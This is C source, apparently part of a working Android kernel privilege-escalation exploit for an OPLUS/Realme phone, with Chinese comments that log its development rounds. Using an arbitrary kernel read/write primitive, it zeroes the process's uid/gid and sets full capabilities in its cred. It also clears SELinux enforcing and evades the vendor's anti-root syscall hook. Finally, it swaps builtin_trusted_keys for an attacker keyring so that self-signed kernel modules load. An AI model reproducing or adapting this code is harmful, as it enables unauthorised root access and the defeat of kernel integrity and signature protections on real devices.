static const char *opt_ksu_mod_a = NULL;   /* A: 原样 vendor .ko (已加载 期望 EEXIST) */
static const char *opt_ksu_mod_b = NULL;   /* B: 改1 字节的同款(期望 EKEYREJECTED) */
static const char *opt_ksu_mod_r = NULL;   /* R: 我方私钥重签的(交换后期望EEXIST = 铁证) */
static uint64_t g_ksu_keyring = 0;      /* 我们自建 session_keyring 的内核指针*/
static uint64_t g_ksu_btk_orig = 0;     /* builtin_trusted_keys 原值*/
static int      g_ksu_btk_valid = 0;
static int      g_ksu_swapped = 0;

static int ksu_read_file(const char *path, uint8_t *buf, size_t cap, size_t *out_len) {
    int f = open(path, O_RDONLY);
    if (f < 0) return -1;
    ssize_t n = read(f, buf, cap);
    close(f);
    if (n <= 0) return -1;
    *out_len = (size_t)n;
    return 0;
}

/* 把builtin_trusted_keys 换成我们的钥匙环 (on=1) 或还原(on=0) */
static int ksu_swap(int fd, uint64_t kb, int on, int verbose) {
    if (!g_ksu_btk_valid) { if (verbose) fprintf(stderr, "[!] builtin_trusted_keys 原值未知-> 拒绝交换\n"); return -1; }
    uint64_t val = on ? g_ksu_keyring : g_ksu_btk_orig;
    if (on && val < KSU_KPTR_MIN) { if (verbose) fprintf(stderr, "[!] 钥匙环指针0x%llx 不合法-> 拒绝交换\n", (unsigned long long)val); return -1; }
    ssize_t w = kern_write(fd, kb + OFF_BUILTIN_TRUSTED_KEYS, &val, 8);
    uint64_t rd = 0;
    kern_read8(fd, kb, kb + OFF_BUILTIN_TRUSTED_KEYS, &rd);
    if (verbose)
        fprintf(stderr, "[*]   %s builtin_trusted_keys = 0x%llx (write %zd errno=%d) 回读=0x%llx %s\n",
                on ? "④ 换成" : "⑥ 还原为", (unsigned long long)val, w, errno, (unsigned long long)rd,
                rd == val ? "★ 一致" : "!! 不一致");
    if (rd == val) { g_ksu_swapped = on; return 0; }
    return -1;
}

/* 用finit_module 加载一个.ko, 返回 syscall 返回值 *err 返回 errno */
static int ksu_insmod(const char *path, int *out_err) {
    *out_err = 0;
    if (!path || !path[0]) { *out_err = EINVAL; return -1; }
    int f = open(path, O_RDONLY | O_CLOEXEC);
    if (f < 0) { *out_err = errno; return -1; }
    errno = 0;
    long r = syscall(__NR_finit_module, f, "", 0);
    *out_err = errno;
    close(f);
    return (int)r;
}

/* 读内核日志尾部(root + permissive 下可用 */
static void ksu_dmesg_tail(int maxlines) {
    static char buf[1 << 17];
    errno = 0;
    long n = syscall(__NR_syslog, KSU_SYSLOG_READ_ALL, buf, sizeof(buf) - 1);
    if (n <= 0) { fprintf(stderr, "[!]   syslog 读取失败 errno=%d\n", errno); return; }
    buf[n] = 0;
    long i; int cnt = 0;
    for (i = n - 1; i >= 0; i--)
        if (buf[i] == '\n' && ++cnt > maxlines) break;
    fprintf(stderr, "----- dmesg 尾部(%d 行 -----\n%s----- end -----\n",
            maxlines, buf + (i < 0 ? 0 : i + 1));
}

static int ksu_probe(int fd, uint64_t kb, uint64_t self_task, const char *der_path,
                     const char *mod_a, const char *mod_b, const char *mod_r) {
    fprintf(stderr, "\n[*] ===== 路线B 验证: 模块签名闸门 (builtin_trusted_keys) =====\n");
    sync();

    /* ★必须先重试task->cred: get_root_proof() 里的 setresuid(0,0,0) 已经换了新cred,
     *   否则读到的是【旧 cred】的 session_keyring, 钥匙环就指错了。*/
    uint64_t cred = 0;
    if (kern_read8(fd, kb, self_task + TASK_CRED_OFF, &cred) != 0 || cred < KSU_KPTR_MIN) {
        fprintf(stderr, "[!]   重读 task->cred 失败 -> 放弃探针\n");
        return -1;
    }
    fprintf(stderr, "[*]   自进程task=0x%llx  cred=0x%llx (已重试\n",
            (unsigned long long)self_task, (unsigned long long)cred);

    uint64_t kr_before = 0;
    if (kern_read8(fd, kb, cred + 0x58, &kr_before) == 0)
        fprintf(stderr, "[*]   ②[前] cred=0x%llx  cred+0x58(session_keyring)=0x%llx %s\n",
                (unsigned long long)cred, (unsigned long long)kr_before,
                kr_before >= KSU_KPTR_MIN ? "★合法内核指针" : "(空异常)");
    else
        fprintf(stderr, "[!]   证cred+0x58 失败\n");

    /* ②建会话钥匙环 */
    errno = 0;
    long rj = syscall(__NR_keyctl, KSU_KEYCTL_JOIN_SESSION_KEYRING, "ghost");
    fprintf(stderr, "[*]   ②keyctl(JOIN_SESSION_KEYRING, \"ghost\") = %ld errno=%d (%s)\n",
            rj, errno, strerror(errno));

    /* ②把自签证书作为asymmetric key 塞进会话钥匙环*/
    static uint8_t der[64 * 1024];
    size_t dlen = 0;
    long ak = -1;
    if (!der_path || ksu_read_file(der_path, der, sizeof(der), &dlen) != 0) {
        fprintf(stderr, "[!]   读证书失败 %s errno=%d\n", der_path ? der_path : "(null)", errno);
    } else {
        errno = 0;
        ak = syscall(__NR_add_key, "asymmetric", "ghost", der, dlen, KSU_KEY_SPEC_SESSION_KEYRING);
        fprintf(stderr, "[*]   ②add_key(\"asymmetric\", \"ghost\", %zuB DER, SESSION) = %ld errno=%d (%s)\n",
                dlen, ak, errno, strerror(errno));
    }

    uint64_t kr_after = 0;
    /* ★关键: keyctl(JOIN_SESSION_KEYRING) 内部走prepare_creds()+commit_creds(),
     *   会【换掉task->cred 对象。 所以必须重读一次task->cred, 否则读到的是时cred 的     *   session_keyring(不含我们刚加的证书, 交换过去就是错的钥匙环。*/
    {
        uint64_t cred2 = 0;
        if (kern_read8(fd, kb, self_task + TASK_CRED_OFF, &cred2) == 0 && cred2 >= KSU_KPTR_MIN) {
            if (cred2 != cred)
                fprintf(stderr, "[*]   ②task->cred 已因 JOIN/add_key 更换: 0x%llx -> 0x%llx (重读)\n",
                        (unsigned long long)cred, (unsigned long long)cred2);
            cred = cred2;
        }
    }
    if (kern_read8(fd, kb, cred + 0x58, &kr_after) == 0)
        fprintf(stderr, "[*]   ②[后] cred+0x58 = 0x%llx  (key serial=%ld) %s\n",
                (unsigned long long)kr_after, ak,
                kr_after >= KSU_KPTR_MIN ? "★ 合法内核指针 -> 这就是要塞进 builtin_trusted_keys 的值"
                                         : "(空/异常)");
    else
        fprintf(stderr, "[!]   证cred+0x58 失败\n");
    g_ksu_keyring = kr_after;

    /* ②读builtin_trusted_keys 原值*/
    uint64_t bk = 0;
    if (kern_read8(fd, kb, kb + OFF_BUILTIN_TRUSTED_KEYS, &bk) == 0) {
        g_ksu_btk_orig = bk;
        g_ksu_btk_valid = 1;
        fprintf(stderr, "[*]   ②builtin_trusted_keys (kb+0x%llx, .bss) = 0x%llx  %s\n",
                (unsigned long long)OFF_BUILTIN_TRUSTED_KEYS, (unsigned long long)bk,
                bk >= KSU_KPTR_MIN ? "★ 非空 (加 34 不 vendor 模块能加载一致)"
                                   : "!! 空 —— 与 vendor 模块能加载矛盾, 需要复查");
    } else {
        fprintf(stderr, "[!]   证builtin_trusted_keys 失败 (偏移植得? 本轮回退)\n");
    }

    if (!mod_a || !mod_b) {
        fprintf(stderr, "[*]   未给 --ksu-mod-a/b -> 只做只读检查\n");
        fprintf(stderr, "[*]   (交换/还原也可用root 守护执行: ./stage1 --su '!ksu swap')\n");
        sync();
        return 0;
    }

    /* ================= A/B 试纸: 用设备上现成的vendor 模块 ================= */
    int e1 = 0, e2 = 0;
    fprintf(stderr, "\n[*]   ===== A/B: 用vendor 模块标定签名闸门语义 =====\n");
    int r1 = ksu_insmod(mod_a, &e1);
    fprintf(stderr, "[*]   A) insmod 原样 vendor 模块 %s -> ret=%d errno=%d (%s)\n",
            mod_a, r1, e1, strerror(e1));
    int r2 = ksu_insmod(mod_b, &e2);
    fprintf(stderr, "[*]   B) insmod 只改 1 字节的同款 %s -> ret=%d errno=%d (%s)\n",
            mod_b, r2, e2, strerror(e2));
    int r0 = -999, e0 = 0;
    if (mod_r) {
        r0 = ksu_insmod(mod_r, &e0);
        fprintf(stderr, "[*]   R) insmod【我方私钥重签】的模块 %s -> ret=%d errno=%d (%s)\n",
                mod_r, r0, e0, strerror(e0));
        fprintf(stderr, "[*]      (交换前期望ENOKEY(%d)=内核不认我们的证书\n", ENOKEY);
    }
    fprintf(stderr, "[*]   判据: A=EEXIST(%d)=签名过且卡在已加载 B=EKEYREJECTED(%d)=签名真在生效\n",
            EEXIST, EKEYREJECTED);
    ksu_dmesg_tail(12);
    sync();

    /* ================= 交换 builtin_trusted_keys -> 我们的钥匙环 ================= */
    fprintf(stderr, "\n[*]   ===== 交换 builtin_trusted_keys 为我们的钥匙环=====\n");
    if (ksu_swap(fd, kb, 1, 1) != 0) {
        fprintf(stderr, "[!]   交换失败 -> 放弃后续\n");
        sync();
        return -1;
    }
    int r3 = ksu_insmod(mod_a, &e2);
    fprintf(stderr, "[*]   C) 交换后再 insmod A -> ret=%d errno=%d (%s)\n", r3, e2, strerror(e2));
    fprintf(stderr, "[*]   ★★ 若从 EEXIST 变成 EKEYREJECTED => 验签确实改看我们的钥匙环了\n");
    fprintf(stderr, "[*]      亦即 用我们私钥签出来的.ko 能加载 路线B 成立。\n");
    if (mod_r) {
        int r5 = ksu_insmod(mod_r, &e0);
        fprintf(stderr, "[*]   ★★★E) 交换后再 insmod 我方重签模块 -> ret=%d errno=%d (%s)\n",
                r5, e0, strerror(e0));
        fprintf(stderr, "[*]       期望 EEXIST(%d) => 【内核接受了自己造的签名。 路线B 最终铁证\n",
                EEXIST);
        ksu_dmesg_tail(8);
    }
    ksu_dmesg_tail(12);

    /* ================= 还原 ================= */
    fprintf(stderr, "\n[*]   ===== 还原 builtin_trusted_keys =====\n");
    ksu_swap(fd, kb, 0, 1);
    int r4 = ksu_insmod(mod_a, &e2);
    fprintf(stderr, "[*]   D) 还原后再 insmod A -> ret=%d errno=%d (%s)  (期望回到 EEXIST)\n",
            r4, e2, strerror(e2));
    /* ★收尾: 本探针大量调用了 kern_read4/kern_read8, 它们会把 busy_read 的ctl_table.data
     *   重定向到"最后读过的地址"并留在那; 必须还原, 否则 /proc/sys/net/core/busy_read 一直是脏的。*/
    if (busy_read_restore(fd, kb) == 0)
        fprintf(stderr, "[*]   已还原busy_read 的ctl_table.data 指针 (收尾)\n");
    sync();
    return 0;
}

static int get_root(int fd, uint64_t kb, int want_shell, const char *cmd) {
    char grb[96];   /* ★GR系列: fsync级阶段标记, 用于panic后精确定位(参考DBY教程崩溃纪律) */
    fprintf(stderr, "\n[*] ===== 提权阶段: 改cred =====\n");
    sync();
    mark_stage("GR1-getroot-start");

    char me[16];
    uint32_t me0 = 0;
    memset(me, 0, sizeof(me));
    /*
     * ★★ 2026-10-09 修: %05d -> %12d, 必须是【恰好 15 字符】。
     *
     * set_task_comm() 在本内核上走 strlcpy(): 它只拷贝 strlen+1 个字节,
     * 【不清理】comm 尾部的旧字节。原来 "gLk%05d" 产出 "gLk13442" 只有 8 字符,
     * 于是 comm[9..15] 保留【上一条名字的残渣】——而下面认领自身时要求
     * comm[8..15] == me[8..15] == 0, 所以只有在"血统里从没出现过 >=10 字符的名字"
     * 时才成立:
     *     adb shell   : init -> adbd -> sh -> setsid -> stage1   尾部一直是 0  ✔
     *     Shizuku/rish: init -> app(comm 15 字符) -> app_process
     *                   -> rish -> sh -> stage1                 尾部被永久污染 ✘
     * 实测污染值 comm[8..15]=0x007200375f333900, 于是"遍历 833 个任务未找到自身"。
     *
     * "%12d" 用【空格】补到 12 位, gLk + 12 = 恰好 15 字符 => strlcpy 写满
     * comm 全部 16 字节 => 比对恒成立, 与血统无关。pid 编码依旧唯一。
     * (前 8 字节 "gLk" + 空格对任何 pid 都相同, 于是真正的判别完全落在
     *  comm[8..15] 上 —— 那正是下面 me8b 的检查, 逻辑不变。)
     */
    snprintf(me, sizeof(me), "gLk%12d", (int)getpid());
    if (prctl(PR_SET_NAME, me, 0, 0, 0) != 0)
        fprintf(stderr, "[!]   prctl(PR_SET_NAME) 失败 errno=%d\n", errno);
    memcpy(&me0, me, 4);
    memcpy(g_self_comm, me, sizeof(g_self_comm) < sizeof(me) ? sizeof(g_self_comm) : sizeof(me));
    uint64_t me8 = 0;
    memcpy(&me8, me, 8);                 /* ★必须比对 8 字节: "gLk11955" 不"gLk12576"
                                          *   前4 字节都是 "gLk1", 只比 4 字节会认领到
                                          *   上一次遗留的 parked 进程! */
    uint64_t me8b = 0;
    memcpy(&me8b, me + 8, 8);
    fprintf(stderr, "[*]   自身 comm = \"%s\" (u64=0x%016llx) pid=%d\n",
            me, (unsigned long long)me8, (int)getpid());
    mark_stage("GR2-comm-set");

    /* ---- 遍历 init_task.tasks 环形链表, 用comm 认领自身 task ---- */
    uint64_t head = kb + OFF_INIT_TASK + TASK_TASKS_OFF;
    uint64_t p = 0, self_task = 0;
    if (kern_read8(fd, kb, head, &p) != 0) {
        fprintf(stderr, "[!]   证init_task.tasks.next 失败 -> 放弃\n");
        return -1;
    }
    int n = 0, nskip = 0;
    while (p && p != head && n < 8192) {
        uint64_t task = p - TASK_TASKS_OFF;
        uint64_t c8 = 0;
        if (kern_read8(fd, kb, task + TASK_COMM_OFF, &c8) != 0) {
            fprintf(stderr, "[!]   证task+0x%llx comm 失败 (第%d 不 -> 放弃\n",
                    (unsigned long long)TASK_COMM_OFF, n);
            break;
        }
        if (c8 == me8) {
            /* ★二次校验 comm[8..15], 彻底排除 pid 位数不同的同名进程*/
            uint64_t c8b = 0;
            kern_read8(fd, kb, task + TASK_COMM_OFF + 8, &c8b);
            if (c8b == me8b) { self_task = task; break; }
            nskip++;
            fprintf(stderr, "[*]   命中 comm[0..7] 位[8..15]=0x%016llx 不符 -> 继续找\n",
                    (unsigned long long)c8b);
        }
        uint64_t nxt = 0;
        if (kern_read8(fd, kb, task + TASK_TASKS_OFF, &nxt) != 0) break;
        if (nxt == p) break;                  /* 自环 = 到顶了*/
        p = nxt; n++;
        /* ★每512个任务落一个fsync标记: 若panic在遍历中途, 标记能精确圈定崩溃区间 */
        if ((n & 511) == 0) {
            snprintf(grb, sizeof(grb), "GR-scan-n%d", n);
            mark_stage(grb);
        }
    }
    snprintf(grb, sizeof(grb), "GR-scan-end-n%d-nskip%d", n, nskip);
    mark_stage(grb);
    if (!self_task) {
        fprintf(stderr, "[!]   遍历 %d 个任务未找到自身 (comm=\"%s\", 已跳过%d 个同名\n",
                n, me, nskip);
        return -1;
    }
    fprintf(stderr, "[*]   ★认领自身 task = 0x%llx (遍历 %d 个任务 跳过同名 %d)\n",
            (unsigned long long)self_task, n, nskip);
    mark_stage("GR3-self-claimed");

    /* ---- 可cred ---- */
    uint64_t real_cred = 0, cred = 0;
    if (kern_read8(fd, kb, self_task + TASK_REAL_CRED_OFF, &real_cred) != 0 ||
        kern_read8(fd, kb, self_task + TASK_CRED_OFF, &cred) != 0) {
        fprintf(stderr, "[!]   证task->cred 失败 -> 放弃\n");
        return -1;
    }
    fprintf(stderr, "[*]   real_cred=0x%llx cred=0x%llx %s\n",
            (unsigned long long)real_cred, (unsigned long long)cred,
            real_cred == cred ? "(相同 -> 就地改一次即可双生效)" : "(不同)");
    if (cred < 0xffffff8000000000ULL || (cred & 7)) {
        fprintf(stderr, "[!]   cred 地址看起来不合法 (0x%llx) -> 拒绝写入\n",
                (unsigned long long)cred);
        return -1;
    }
    /* ★保险: cred->usage (atomic_t @0x00) 必须是个小正整数, 否则说明 0x800 不是 cred */
    uint32_t usage = 0, uid_before = 0, capeff_before = 0;
    kern_read4(fd, kb, cred + 0x00, &usage);
    kern_read4(fd, kb, cred + 0x04, &uid_before);
    kern_read4(fd, kb, cred + CRED_CAP_EFF_OFF, &capeff_before);
    fprintf(stderr, "[*]   [改前] cred.usage=%u cred.uid=%u cred.cap_effective.lo=0x%08x\n",
            usage, uid_before, capeff_before);
    if (usage == 0 || usage > 0x10000) {
        fprintf(stderr, "[!]   cred->usage=%u 不合理-> 地址不是 cred, 拒绝写入\n", usage);
        return -1;
    }
    if (uid_before == 0) {
        fprintf(stderr, "[*]   注意: 本进程cred.uid 已经是0 (可能已提权过), 继续\n");
    }
    snprintf(grb, sizeof(grb), "GR4-cred-read-cred=%llx-usage%u",
             (unsigned long long)cred, usage);
    mark_stage(grb);

    /* =====================================================================
     * ★★ 第三十五轮· 别名探针 (⚠️ 默认关闭, 需 --alias-probe 才跑)
     *
     *   ⚠️ ZI11 血泪结论 本块用【猜测的 DRAM 基址】算 linear-map 别名再读,
     *      未映射⇒内核 oops ⇒【设备重启】。已实测两次(第三十五轮：     *      第三十六轮又一次日志停在 cred 阶段 header, 正是本块)。     *      所以默认绝不执行 只在明确要做这个实验时用 --alias-probe 打开。     *   目的(历史): CONFIG_STRICT_KERNEL_RWX 设.text 在内核自身映射里只读,
     *   但若同一物理页在 linear map 里的别名可写, 就能 NOP 接oplus_root_check。     *   ★第三十六轮起我们【不再需要】它: 给MODULE_SIG_FORCE 走     *     builtin_trusted_keys(.bss, 8 字节写 这条路 完全不碰 .text。     * ===================================================================== */
    if (opt_alias_probe) {
        uint64_t kvo = 0, msa = 0;
        int r1 = kern_read8(fd, kb, kb + OFF_KIMAGE_VOFFSET, &kvo);
        int r2 = kern_read8(fd, kb, kb + OFF_MEMSTART_ADDR, &msa);
        fprintf(stderr, "[*]   [别名探针] kimage_voffset=0x%llx (r=%d)   memstart_addr=0x%llx (r=%d)\n",
                (unsigned long long)kvo, r1, (unsigned long long)msa, r2);
        if (r1 != 0 || kvo < 0xffffff0000000000ULL) {
            fprintf(stderr, "[!]   别名探针: kimage_voffset 取值失败\n");
        } else {
            /* pa(_text) 已实测 memstart_addr 直接用读到的值可能看着不像物理地址",
             * 所以再并行试几个常见DRAM 基址, 用【已知指令字】命中的那一组作准。*/
            uint64_t pa_text = kb - kvo;
            uint64_t cand[6];
            int nc = 0;
            cand[nc++] = msa;                       /* 读到的值*/
            cand[nc++] = 0x80000000ULL;             /* 常见 DRAM 基址 */
            cand[nc++] = 0x40000000ULL;
            cand[nc++] = 0xC0000000ULL;
            cand[nc++] = 0x0ULL;
            fprintf(stderr, "[*]     pa(_text)=0x%llx  (期望 ARM64 默认 0x80080000)\n",
                    (unsigned long long)pa_text);
            struct { uint64_t off; uint32_t want; const char *nm; } chk[] = {
                { 0x0218E0ULL, 0xA9BA7BFDu, "oplus_root_check_succ" },
                { 0x021B6CU, 0xAA1E03F5u, "oplus_root_check" },
                { 0x0000000ULL, 0x147E0000u, "镜像首B" },
            };
            uint64_t best = 0;
            for (int c = 0; c < nc; c++) {
                if (c > 0 && cand[c] == cand[0]) continue;
                uint64_t alias = PAGE_OFFSET_39 + (pa_text - cand[c]);
                /* ★安全性 只先读【一个字】核对 命中才继续读其它。                 *   未映射地址的读会让内核 oops(实测会把设备搞重启, 所以绝不盲扫。*/
                uint32_t g0 = 0;
                kern_read4(fd, kb, alias + chk[0].off, &g0);
                if (g0 != chk[0].want) {
                    fprintf(stderr, "[*]       试基址 0x%010llx -> 别名 0x%llx : "
                                    "succ=0x%08x (期望 0x%08x) 不匹配\n",
                            (unsigned long long)cand[c], (unsigned long long)alias,
                            g0, chk[0].want);
                    continue;
                }
                uint32_t gw = 0, gz = 0;
                kern_read4(fd, kb, alias + chk[1].off, &gw);
                kern_read4(fd, kb, alias + chk[2].off, &gz);
                fprintf(stderr, "[*]       试基址 0x%010llx -> 别名 0x%llx : "
                                "succ=0x%08x check=0x%08x head=0x%08x  ★命中\n",
                        (unsigned long long)cand[c], (unsigned long long)alias, g0, gw, gz);
                best = alias;
                break;
            }
            if (!best) {
                fprintf(stderr, "[!]   所有候选都不匹配-> 拿不到.text 的linear-map 别名\n");
                sync();
            } else {
                fprintf(stderr, "[*]   ★别名成立: .text 别名基址 = 0x%llx\n",
                        (unsigned long long)best);
                /* ---- no-op 写测试 把【读到的原值】原样写回去 ----
                 * 成功 => 别名页可写(.text 只读被绕过; 失败 => 可oops 掉本进程。*/
                uint32_t probe_off = 0x021B00;      /* oplus_root_reboot 首4B */
                uint32_t orig = 0;
                kern_read4(fd, kb, best + probe_off, &orig);
                errno = 0;
                ssize_t w = kern_write(fd, best + probe_off, &orig, 4);
                int we = errno;
                uint32_t back = 0;
                kern_read4(fd, kb, best + probe_off, &back);
                fprintf(stderr, "[*]   [no-op 写测试] 别名+0x%x 原值0x%08x ; "
                                "kern_write 原样写回 -> %zd (errno=%d) ; 读回=0x%08x\n",
                        probe_off, orig, w, we, back);
                fprintf(stderr, "[*]   ==> %s\n",
                        (w == 4 && back == orig)
                            ? "★★★ .text 别名【可写】 linear-map 绕过了 STRICT_KERNEL_RWX ——"
                              "NOP 掉 oplus_root_check 与绕 MODULE_SIG_FORCE 都可行"
                            : "(!) 别名不可写或写失败) -> .text 只读无法绕过");
                sync();
            }
        }
    }

    /* =====================================================================
     * ★★★第三十五轮 绕过 OPLUS 可root 防护 (oplus_root_check) 的正确姿加     *
     * 本机 oplus_root_check 是OPLUS 插进 el0_svc_naked 的syscall 钩子
     *   (0x3CB8: adr x16, oplus_root_check ; blr x16):
     *     x19 = *(u64*)(cred+0x04)  {uid,gid}      <- syscall 前快照     *     x20 = *(u64*)(cred+0x14)  {euid,egid}
     *     x29 = *(u64*)(cred+0x1c)  {fsuid,fsgid}
     *     blr sys_call_table[nr]                   <- 真syscall
     *   返回后逐字段比对 有变化且 nr 不在白名单-> 上报用户态+ SIGKILL + 重启。     *   白名单实测) = {0x8f..0x93,0x95} −{0xcb,0xcc,0xd0,0xd2,0xd5,0xd6},
     *     其中 compat 行0xcb/0xcc/0xd0/0xd2/0xd5/0xd6 正是
     *     setreuid/setregid/setresuid/setresgid/setuid/setgid ——★setuid 家族本身!
     *   另有: 若syscall 前{uid,gid} 已== 0, 整个检查直接短路。     *   ★★ 防护【只】比对那 6 不uid/gid 字段, 完全不看 cap_* 不SELinux sid。     *
     * 于是:
     *   ⓪任意写把 g_boot_state 置1 (们--unlock-flag 时 会让 is_unlocked() 直接放行)
     *   ①任意写把 cred+0x24 的securebits/cap_* 全置 1   (不动 uid -> 防护无感)
     *   ①任意写把 cred->security 的osid/sid 置1 (SECINITSID_KERNEL) (同样无感)
     *   ③正式调setuid(0) (系统调用只213) / setgid(0) (214) ——白名单号 -> 放行
     *   => uid=gid=0 之后防护对本报程永久短路。     * ===================================================================== */
    if (opt_unlock_flag) {
        /* ★★ 2026-11-18 GR标记定位: kern_write(kb+0x17bc458) 必崩 __arch_copy_from_user
         *   (db.fatal KE + GR-pre-bootstate-write 后必REBOOT, 两轮复现)。
         *   0x17bc458 在镜像内已映射, 但写入必panic => 目标页只读:
         *   g_boot_state 大概率在 .data..read_mostly, arm64 STRICT_KERNEL_RWX
         *   init 后把 __read_mostly 页设为只读 => copy_from_user 写权限错误。
         *   而 setuid32/setgid32 本就在 oplus 白名单, caps 置满后内核能力检查也能过
         *   => 默认【跳过】此写; 仅 --write-bootstate 才试(用于离线验证 RO 假设)。 */
        if (opt_write_bootstate) {
            uint32_t one = 1;
            errno = 0;
            mark_stage("GR-pre-bootstate-write");
            ssize_t w0 = kern_write(fd, kb + OFF_G_BOOT_STATE, &one, 4);
            fprintf(stderr, "[*]   ⓪pwrite(g_boot_state=1) -> %zd errno=%d  (is_unlocked() 将为真\n",
                    w0, errno);
            sync();
            mark_stage("GR5-bootstate-done");
        } else {
            fprintf(stderr, "[*]   ⓪跳过 g_boot_state 写 (GR标记证实该页只读, 必崩"
                            "copy_from_user; 依赖白名单+caps 路线\n");
            mark_stage("GR5-bootstate-skipped");
        }
    }

    /* =====================================================================
     * ★★★第三十五轮【真机血泪教训。 必须先把 cred 私有化
     *
     * 实测本机 shell(uid 2000) 的cred 被【大量任务共享。cred.usage 实测
     * 1199 / 1483 / 3014)。若直接就地改这个共享cred:
     *   - 把caps 置满 => 几千个进程一起拿到full caps;
     *   - 把cred->security 的sid 置1 => 几千个进程一起变成u:r:kernel:s0,
     *     配合 CONFIG_OPLUS_FEATURE_SELINUX_CONTROL_LOG=y 引发 SELinux 审计风暴,
     *     结果本进程会【永之sleep 在write() 上。State=S, 时SigPnd;
     *     /proc/<pid>/status 已显示CapEff=ffffffffffffffff 不attr=kernel:s0,
     *     说明内存写早已落地 只是 syscall 回不来。真机复现两次。     *
     * 解法: setresuid(自己,自己,自己) / setresgid(...) 会走
     *   prepare_creds() + commit_creds() 造出【本进程私有】的 cred;
     *   因为 uid 值完全不可 只比对uid/gid 的反 root 防护【完全无感。
     *   而且 208/210 本来就在白名单里。     * ===================================================================== */
    errno = 0;
    long pr_u = syscall(NR_setresuid32, (long)getuid(), (long)getuid(), (long)getuid());
    int eu = errno;
    errno = 0;
    long pr_g = syscall(NR_setresgid32, (long)getgid(), (long)getgid(), (long)getgid());
    int eg = errno;
    fprintf(stderr, "[*]   ⓪私有化cred: setresuid32(%d,%d,%d)=%ld(errno=%d)  "
                    "setresgid32=%ld(errno=%d)\n",
            (int)getuid(), (int)getuid(), (int)getuid(), pr_u, eu, pr_g, eg);
    sync();
    uint64_t cred_old = cred;
    uint64_t cred_new = 0;
    if (kern_read8(fd, kb, self_task + TASK_CRED_OFF, &cred_new) == 0 && cred_new) {
        cred = cred_new;
        fprintf(stderr, "[*]      task->cred: 0x%llx -> 0x%llx%s\n",
                (unsigned long long)cred_old, (unsigned long long)cred,
                cred == cred_old ? " (未换对象 -> 仍是共享 cred, 后续操作会波及他了)"
                                 : " (★已换成私有cred)");
    }
    uint32_t u_now = 0xdead;
    kern_read4(fd, kb, cred + 0x04, &u_now);
    if (u_now != (uint32_t)getuid()) {
        fprintf(stderr, "[!]      新cred.uid=%u != getuid()=%d -> 认错对象, 放弃\n",
                u_now, (int)getuid());
        return -1;
    }
    sync();
    snprintf(grb, sizeof(grb), "GR6-priv-cred-cred=%llx-uid%u",
             (unsigned long long)cred, u_now);
    mark_stage(grb);

    /* ---- ②cap_* 全1 (cred+0x24 走44 字节: securebits=0 + 5 给cap=~0) ----
     * 只动 0x24..0x50, 不碰 0x04..0x24 的uid/gid 段=> 防护不会触发 */
    uint8_t caps[44];
    memset(caps, 0, sizeof(caps));
    memset(caps + 4, 0xFF, sizeof(caps) - 4);
    errno = 0;
    /* ---- ②-pre ★提前清 selinux enforcing (+2) ----
     * 必须在第一次 setuid 尝试【之前】做: 否则失败会被 avc 缓存, 之后清了
     * enforcing 也命中缓存继续拒。清零后 compute_av 首算即带 PERMISSIVE 标志。 */
    {
        mark_stage("GR-pre-selinux-flip");
        uint8_t z3[3] = { 0, 0, 0 };   /* +0 disabled, +1 checkreqprot, +2 enforcing */
        errno = 0;
        ssize_t ws = kern_write(fd, kb + OFF_SELINUX_STATE, z3, 3);
        uint32_t chk_s = 0xdeadbeef;
        kern_read4(fd, kb, kb + OFF_SELINUX_STATE, &chk_s);
        fprintf(stderr, "[*]   ②-pre selinux enforcing(+2) 清0 -> pwrite %zd, 读回 0x%08x (期望 0x00000001)\n",
                ws, chk_s);
        sync();
        mark_stage("GR-selinux-flipped");
    }

    mark_stage("GR-pre-caps-write");
    ssize_t w1 = kern_write(fd, cred + 0x24, caps, sizeof(caps));
    fprintf(stderr, "[*]   ②pwrite(cred+0x24, 44B: securebits=0 + 5×cap=~0) -> %zd errno=%d\n",
            w1, errno);
    mark_stage("GR7-caps-written");
    uint32_t eff_lo = 0, eff_hi = 0;
    kern_read4(fd, kb, cred + CRED_CAP_EFF_OFF, &eff_lo);
    kern_read4(fd, kb, cred + CRED_CAP_EFF_OFF + 4, &eff_hi);
    fprintf(stderr, "[*]      读回 cap_effective = 0x%08x%08x (期望 ffffffffffffffff)\n", eff_hi, eff_lo);
    sync();

    /* ---- ②c ★RMX3031: 直写 uid/gid 段 (绕过所有 syscall 级防护) ----
     * GR标记+反汇编证实: setuid32 被拒是 oplus commit_creds/setuid 钩子 (errno=EPERM
     * 而非 avc 的 EACCES), 且 g_boot_state 页只读写不了。对策: 完全不走 syscall,
     * 直接 kern_write 把私有 cred 的 +0x04..0x23 (uid/gid/suid/sgid/euid/egid/
     * fsuid/fsgid 共8个u32) 清零 —— 纯内存写, 任何 syscall 钩子都看不见。 */
    {
        mark_stage("GR-pre-uid-write");
        uint8_t zids[32];
        memset(zids, 0, sizeof(zids));
        errno = 0;
        ssize_t wu = kern_write(fd, cred + 0x04, zids, sizeof(zids));
        fprintf(stderr, "[*]   ②c pwrite(cred+0x04, 32B uid/gid/suid/sgid/euid/egid/fsuid/fsgid=0) -> %zd errno=%d\n",
                wu, errno);
        sync();
        mark_stage("GR-uid-written");
        uint32_t chk_uid = 0xffffffff;
        kern_read4(fd, kb, cred + 0x04, &chk_uid);
        fprintf(stderr, "[*]      读回 cred.uid = %u (期望 0)\n", chk_uid);
        sync();
    }

    /* ---- ②【故意不再sid!。----
     * 原设计是把cred->security 的osid/sid 改成 1 (SECINITSID_KERNEL), 设     * SELinux 的能力检查通过。真机证明 这一步正是卡死"的来源——一旦进程进入     * u:r:kernel:s0, 后续 write() 会陷全SELinux 审计阻塞。     * 改用下面 ③b 的permissive 兜底 (更精出 只放来avc 判定, 不换域。*/
    if (opt_set_sid) {
        uint64_t sec = 0;
        if (kern_read8(fd, kb, cred + CRED_SECURITY_OFF, &sec) == 0 && sec >= 0xffffff8000000000ULL) {
            uint32_t ids[2] = { SECINITSID_KERNEL, SECINITSID_KERNEL };
            errno = 0;
            ssize_t w3 = kern_write(fd, sec, ids, sizeof(ids));
            fprintf(stderr, "[*]   ②(--set-sid) cred->security=0x%llx pwrite({1,1}) -> %zd errno=%d\n",
                    (unsigned long long)sec, w3, errno);
        }
    } else {
        fprintf(stderr, "[*]   ②跳过 sid 写入 (避免进入 kernel 域引发审计阻塞\n");
    }
    sync();

    /* ---- ③④ 走白名单系统调用号正大光明地 setuid/setgid ----
